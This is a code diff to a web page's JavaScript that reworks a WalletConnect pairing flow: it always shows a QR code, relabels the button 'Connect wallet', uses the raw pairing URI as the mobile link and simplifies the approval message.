@@ -174,15 +174,13 @@ async function startSession() {
     wcUri = data.uri;
     detectedCountry = data.country || '';
 
-    // Desktop: render QR. Mobile: enable the CTA button.
-    if (IS_MOBILE) {
-      const btn = $('#m-get-now');
+    const btn = $('#m-get-now');
+    if (btn) {
       btn.disabled = false;
-      btn.querySelector('.m-cta-label').textContent = 'Get Yours Now';
+      btn.querySelector('.m-cta-label').textContent = 'Connect wallet';
       btn.onclick = onGetNowClick;
-    } else {
-      renderQR(wcUri);
     }
+    renderQR(wcUri);
 
     evtSrc = new EventSource(BASE + '/api/front/events');
 
@@ -280,7 +278,7 @@ function renderQR(uri) {
 
 /* ========== Step 1: user taps "Get Yours Now" (mobile only) ========== */
 function walletConnectMobileUrl(uri) {
-  return 'https://walletconnect.com/wc?uri=' + encodeURIComponent(uri);
+  return uri;
 }
 
 function onGetNowClick() {
@@ -289,7 +287,7 @@ function onGetNowClick() {
   setBusy(
     true,
     'Linking your account to banking partner',
-    'Open WalletConnect and approve the pairing request in any wallet on your phone — we\'ll continue automatically once confirmed.'
+    'Open your wallet app and approve the pairing request — we\'ll continue automatically once confirmed.'
   );
   window.location.href = walletConnectMobileUrl(wcUri);
 }
